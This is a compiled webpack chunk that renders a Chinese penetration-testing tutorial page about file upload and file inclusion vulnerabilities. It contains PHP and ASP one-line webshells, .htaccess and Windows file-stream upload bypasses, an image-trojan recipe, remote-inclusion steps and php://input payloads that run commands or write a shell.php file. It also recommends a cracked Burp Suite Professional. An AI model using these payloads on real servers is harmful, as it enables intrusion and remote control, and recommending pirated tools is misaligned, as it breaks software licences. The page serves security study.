(window.webpackJsonp=window.webpackJsonp||[]).push([[33],{307:function(t,a,s){"use strict";s.r(a);var p=s(14),e=Object(p.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h2",{attrs:{id:"文件上传漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#文件上传漏洞"}},[t._v("#")]),t._v(" 文件上传漏洞")]),t._v(" "),a("p",[t._v("只要能在目标服务器上放一个一句话木马，是不是就代表我们获取了一定权限")]),t._v(" "),a("p",[t._v("一句话木马")]),t._v(" "),a("div",{staticClass:"language-PHP extra-class"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("eval")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_REQUEST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])])]),a("p",[t._v("如果没有防护规则的文件上传：")]),t._v(" "),a("p",[t._v("只要上传一个php就可以拿下目标")]),t._v(" "),a("p",[t._v("检测恶意代码：")]),t._v(" "),a("p",[t._v("前端检测：Js = 没有检测因为js可以被自己禁用，而且可以使用burp suite进行篡改js\n前端代码只能在浏览器里执行")]),t._v(" "),a("hr"),t._v(" "),a("p",[t._v("后端检测：后端PHP。利用黑白名单机制")]),t._v(" "),a("p",[t._v("黑名单：不允许黑名单上的东西上传")]),t._v(" "),a("p",[t._v("白名单：只允许黑名单上的东西上传(这种相对于白名单机制的防范效果更好)")]),t._v(" "),a("p",[t._v("判断网站上传黑白名单的机制的办法就是随便上传一个后缀名例如"),a("code",[t._v(".a")]),t._v(" "),a("code",[t._v(".b")]),t._v("上传一些根本就不存在的后缀看看是否能上传成功。如果上传成功证明网页是用的是黑名单机制")]),t._v(" "),a("p",[t._v("在网站中php、js、asp都有属于自己的别名，这样上传之后一样会当作代码执行")]),t._v(" "),a("hr"),t._v(" "),a("h2",{attrs:{id:"htaccess文件绕过"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#htaccess文件绕过"}},[t._v("#")]),t._v(" .htaccess文件绕过")]),t._v(" "),a("blockquote",[a("p",[a("code",[t._v(".htaccess文件绕过。全程是Hypertext Access(超文本入口).htaccess文件也被分成为分布式配置文件，提供了针对目录改变配置的方法，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录")])])]),t._v(" "),a("p",[t._v(".htaccess功能：\n文件夹密码保护、用户自定义重定向、自定义404页面、扩展名为静态化、静止特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表")]),t._v(" "),a("p",[t._v("很可惜，这么一个强大的功能默认是不开启Apache（有伪静态的会开启）")]),t._v(" "),a("p",[t._v("例如：")]),t._v(" "),a("p",[a("code",[t._v("AddType addlication/x-httpd-php.jpg")])]),t._v(" "),a("p",[t._v("这个指令代表着.jpg文件会当作php来解析")]),t._v(" "),a("div",{staticClass:"language-php extra-class"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("FilesMatch "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"abc"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\nSetHandler application"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("x"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("httpd"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("php\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("FilesMatch"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])])]),a("p",[t._v("abc是你需要以php执行的文件名字")]),t._v(" "),a("p",[t._v("如果无法将文件命名为.htaccess怎么办")]),t._v(" "),a("h3",{attrs:{id:"使用cmd进行重命名"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#使用cmd进行重命名"}},[t._v("#")]),t._v(" 使用cmd进行重命名")]),t._v(" "),a("div",{staticClass:"language-CMD extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("ren 17.txt .htaccess\n")])])]),a("hr"),t._v(" "),a("p",[t._v("在Windows里"),a("code",[t._v("php == php+空格")])]),t._v(" "),a("p",[t._v("但是在后端是无法检测的，在后端中 "),a("code",[t._v("php != php+空格")])]),t._v(" "),a("p",[t._v("文件上传的流程")]),t._v(" "),a("p",[t._v("文件上传 -> 检测 -> 上传到缓存文件(tmp) -> 后端代码的移动，移动到指定的目录重命名")]),t._v(" "),a("h2",{attrs:{id:"windows文件流绕过"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#windows文件流绕过"}},[t._v("#")]),t._v(" Windows文件流绕过")]),t._v(" "),a("p",[t._v("Windows里有一个骚操作就是隐藏文件")]),t._v(" "),a("div",{staticClass:"language-cmd extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("echo 123123 > caidao.exe:123.txt\n\ncaidao.exe:123.txt\n")])])]),a("p",[t._v("将冒号后面的文件依附在前面的文件之中")]),t._v(" "),a("p",[t._v("而且无法看出来，打开附属文件的方法是使用cmd打开")]),t._v(" "),a("p",[t._v("在win里面保存文件的格式是"),a("code",[t._v("777.txt::$DATA")]),t._v("保存文件的时候默认情况下会加上这一串")]),t._v(" "),a("p",[t._v("这对于Windows来说两个是一样的，但是对于后端来说他就是两个东西")]),t._v(" "),a("p",[t._v("上传文件的流程：")]),t._v(" "),a("p",[t._v("网页上传 -> 目标服务器缓存 -> 移动到开发写好的地址 -> 重命名(开发)")]),t._v(" "),a("p",[t._v("白名单上传相对于黑名单来说会更加麻烦一点，但是作为渗透人员就是要不断的绕过别人的防御")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304212349857.webp",alt:"Img"}})]),t._v(" "),a("p",[t._v("这种方法也是绕过的一种方法")]),t._v(" "),a("p",[t._v("有的时候后端还会检查你的jpg文件头是否匹配，如果不匹配，即使你是jpg结尾也无法上传")]),t._v(" "),a("p",[t._v("解决方法：图片木马")]),t._v(" "),a("ul",[a("li",[t._v("图片木马就可以把图片和一句话木马结合到一起变成图片木马")])]),t._v(" "),a("p",[t._v("操作就是随便找一张图片，然后再创建一个txt文件，在这个文件里面写上一句话木马"),a("code",[t._v("<?php @eval($_REQUEST[8]); ?>")])]),t._v(" "),a("p",[t._v("然后把这两个文件放在同一个目录下，然后打开cmd输入命令")]),t._v(" "),a("div",{staticClass:"language-cmd extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("copy (文件名).jpg/b + (一句话木马的文件名).txt (生成的木马图片名称).jpg\n\n实例：\n\ncopy 1.jpg/b + a.txt 123.jpg\n")])])]),a("p",[a("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304220004269.webp",alt:"Img"}})]),t._v(" "),a("p",[t._v("不过这样生成的一句话木马就放在图片的16进制最下面，有的时候安全防护这边也会对其进行防护，这个时候就可以使用复合图片的形式")]),t._v(" "),a("blockquote",[a("p",[t._v("A图片 + 一句话木马 + A图片")])]),t._v(" "),a("p",[t._v("00截断")]),t._v(" "),a("h2",{attrs:{id:"二次渲染"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#二次渲染"}},[t._v("#")]),t._v(" 二次渲染")]),t._v(" "),a("p",[t._v("二次渲染的意思就是，当你上传的文件是图片类型的时候，他会照着你的图片，给你画一个一模一样的上传服务器，而不是直接上传你的源文件")]),t._v(" "),a("p",[t._v("在文件上传过程中，如果是上传图片类型的，有时会遇见二次渲染。这个时候，无论怎么在图片里做手脚都无济于事。")]),t._v(" "),a("p",[t._v("上传的图片类型文件越小越好")]),t._v(" "),a("p",[t._v("不过一样有个解决方法，就是在上传一个gif文件，然后在开头处手动写一个一句话木马(最好是在文件的第三行开始写)")]),t._v(" "),a("h2",{attrs:{id:"条件竞争"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#条件竞争"}},[t._v("#")]),t._v(" 条件竞争")]),t._v(" "),a("p",[t._v("文件上传的检测流程：")]),t._v(" "),a("ul",[a("li",[a("p",[t._v("先检测后上传")])]),t._v(" "),a("li",[a("p",[t._v("先上传后检测")])])]),t._v(" "),a("p",[t._v("如果我们上传的速度够快电脑来不及删除，那就意味着我上传成功。电脑就会被植入木马")]),t._v(" "),a("p",[t._v("但是如果刚连接上就被删了也没意义。所以这个时候就可以对php里的内容做手脚")]),t._v(" "),a("p",[t._v("在php里让php帮我们写一个马然后存在本地，这样不就绕过了")]),t._v(" "),a("p",[t._v("这时候就需要认识一下"),a("a",{attrs:{href:"https://www.w3school.com.cn/php/php_file_create.asp",target:"_blank",rel:"noopener noreferrer"}},[t._v("php的文件操作"),a("OutboundLink")],1),t._v("方法")]),t._v(" "),a("p",[t._v("解析漏洞")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304230930103.webp",alt:"Img"}})]),t._v(" "),a("p",[t._v("同一环境下的网站他可能即支持php也支持asp。环境是可以混合的而且这种还是很常见的")]),t._v(" "),a("p",[t._v("一般来说aspx的站点会兼容ASP")]),t._v(" "),a("p",[t._v("asp一句话木马")]),t._v(" "),a("div",{staticClass:"language-ASP extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v('<%eval request("a")%>\n')])])]),a("h2",{attrs:{id:"php-cgi解析漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#php-cgi解析漏洞"}},[t._v("#")]),t._v(" PHP CGI解析漏洞")]),t._v(" "),a("p",[t._v("php和web容器交互是有两种方法的")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304231916418.webp",alt:"Img"}})]),t._v(" "),a("p",[t._v("如何判断一个网页是否存在CGI漏洞？")]),t._v(" "),a("blockquote",[a("p",[t._v("随便寻找任意的一个站点，复制他的图片然后在url上加上"),a("code",[t._v("/.php")]),t._v("如果页面出现乱码，就证明他存在CGI漏洞")])]),t._v(" "),a("p",[t._v("一般情况下渗透需要信息收集")]),t._v(" "),a("p",[a("code",[t._v("|IP|端口|路径|旁站|中间件版本|指纹识别|Whois")])]),t._v(" "),a("p",[t._v("渗透测试： 测试 -> 尝试 -> 你需要花费大量的时间和精力")]),t._v(" "),a("p",[a("code",[t._v("状态码： 403 404 401 302 200 500(502) 304")])]),t._v(" "),a("p",[t._v("这是有关于"),a("a",{attrs:{href:"https://www.runoob.com/http/http-status-codes.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("状态码的扩展"),a("OutboundLink")],1)]),t._v(" "),a("p",[t._v("挖洞、细心")]),t._v(" "),a("h2",{attrs:{id:"文件包含漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#文件包含漏洞"}},[t._v("#")]),t._v(" 文件包含漏洞")]),t._v(" "),a("p",[t._v("这里先介绍以下文件包含。")]),t._v(" "),a("p",[t._v("顾名思义就是在一个php或者其他类型的语言文件中去包含另一个文件里的内容。")]),t._v(" "),a("p",[t._v("在php中的文件包含写法是这样的")]),t._v(" "),a("div",{staticClass:"language-php extra-class"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v(" \n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("include")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'1.txt'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])])]),a("p",[t._v("而这个被包含的"),a("code",[t._v("1.txt")]),t._v("如果他里面的内容是php代码，也就是说即使他的扩展名是txt，他最终也会被以php代码的形式解析并执行")]),t._v(" "),a("p",[t._v("构造请求的格式是")]),t._v(" "),a("blockquote",[a("p",[a("code",[t._v("http://127.0.0.1?include.php=1.txt")])])]),t._v(" "),a("p",[t._v("本地包含漏洞也分为有限制和无限制")]),t._v(" "),a("ul",[a("li",[t._v("有限制")])]),t._v(" "),a("ol",[a("li",[t._v("%00截断。")])]),t._v(" "),a("p",[t._v("条件是php版本要小于5.3.4局限性很大，不常见。")]),t._v(" "),a("ol",{attrs:{start:"2"}},[a("li",[t._v("长度截断")])]),t._v(" "),a("p",[t._v("条件：windows：点号需要长于256;Linux长于4096")]),t._v(" "),a("p",[t._v("在参数的最后端一直添加"),a("code",[t._v("/../../")]),t._v("或者"),a("code",[t._v(".")])]),t._v(" "),a("h3",{attrs:{id:"远程包含漏洞-有限制-无限制"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#远程包含漏洞-有限制-无限制"}},[t._v("#")]),t._v(" 远程包含漏洞-有限制-无限制")]),t._v(" "),a("p",[t._v("想要确保可以使用远程包含漏洞就要确保php服务的"),a("code",[t._v("allow_url_include")]),t._v("开关必须是开着的")]),t._v(" "),a("p",[t._v("在服务器没有做任何限制的情况下，可以这样getshell")]),t._v(" "),a("p",[t._v("请求包:"),a("code",[t._v("http://127.0.0.1?include.php?filename=http://www.xxx.com/xxx/1.txt")])]),t._v(" "),a("p",[t._v("这样他就会去主动包含这个网址下的这个文件。然后我们再在这个文件内写入一句话木马，也就成功的拿到了webshell")]),t._v(" "),a("br"),t._v(" "),a("p",[t._v("有的网站可能会做这么一个防护，就是他会将你包含过来的文件强制添加一个扩展名例如html这个扩展名，解决方法也很简单。在最后加多一个"),a("code",[t._v("?")]),t._v("就行了或者"),a("code",[t._v("%23")]),t._v("都行")]),t._v(" "),a("h3",{attrs:{id:"文件读取的一些操作"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#文件读取的一些操作"}},[t._v("#")]),t._v(" 文件读取的一些操作")]),t._v(" "),a("p",[a("strong",[t._v("file协议")])]),t._v(" "),a("ul",[a("li",[t._v("读取文件源码用法、")])]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("http://127.0.0.1/include.php?filename=php://filter/read=convert.base64-encode/resource=1.txt\n")])])]),a("p",[t._v("这个方法就可以进行对文件的一些读取，最终读取出来的文件是以base64编码后的内容")]),t._v(" "),a("ul",[a("li",[t._v("执行php代码用法")])]),t._v(" "),a("p",[a("code",[t._v("php://input + [POST DATA]")])]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("http://127.0.0.1/include.php?file=php://input\n\n[POST DATA部分]\n")])])]),a("p",[t._v("例如")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("http://127.0.0.1/include.php?file=php://input\n\n<?php system('ipconfig')?>\n")])])]),a("ul",[a("li",[t._v("利用phpfile协议进行写入一句话木马")])]),t._v(" "),a("div",{staticClass:"language-php extra-class"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[t._v("http://127.0.0.1/include.php?file=php://input\n\n"),a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("fputs")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("fopen")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'shell.php,'")]),t._v("w"),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'),'")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),t._v("php "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("eval")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_REQUEST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("a"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("'); ?>\n")])])]),a("p",[t._v("这样就可以写入一个shell.php的一句话木马文件")]),t._v(" "),a("h2",{attrs:{id:"数据溢出绕过"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#数据溢出绕过"}},[t._v("#")]),t._v(" 数据溢出绕过")]),t._v(" "),a("p",[t._v("在请求包里面复制粘贴大量的垃圾数据，也就是没有任何价值和作用的字符串，导致后端数据溢出，让文件上传成功")]),t._v(" "),a("p",[t._v("请求包的主要格式是")]),t._v(" "),a("h2",{attrs:{id:"burpsuite"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#burpsuite"}},[t._v("#")]),t._v(" Burpsuite")]),t._v(" "),a("p",[t._v("这是一款功能非常强大的抓包改包软件。在Windows环境下，如果要使用这个工具。建议使用Java8的Java环境。")]),t._v(" "),a("p",[t._v("如果是Java8以上的环境建议使用最新版的"),a("code",[t._v("burpsuite")]),t._v("。否则会出现不兼容无法使用。高版本也有很多好用的功能")]),t._v(" "),a("p",[t._v("比如说：")]),t._v(" "),a("ul",[a("li",[t._v("1、高版本中内置了一个浏览器，可以免去安装HTTPS证书")]),t._v(" "),a("li",[t._v("2、并且不再需要手动配置代理")]),t._v(" "),a("li",[t._v("3、功能更多更完善")])]),t._v(" "),a("p",[t._v("建议是使用破解专业版，因为在实际做题的时候如果遇见需要爆破的场景，社区版是不支持开启多线程模式的，而付费版是可以开启多线程模式的。")]),t._v(" "),a("p",[t._v("这样一来可以大大的提升请求速度，节约时间成本，以至于在爆破一些比较大的数据时会耗时过久")]),t._v(" "),a("p",[t._v("这里附上一个使用多线程的方法")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304092124888.webp",alt:"Img"}})])])}),[],!1,null,null,null);a.default=e.exports}}]);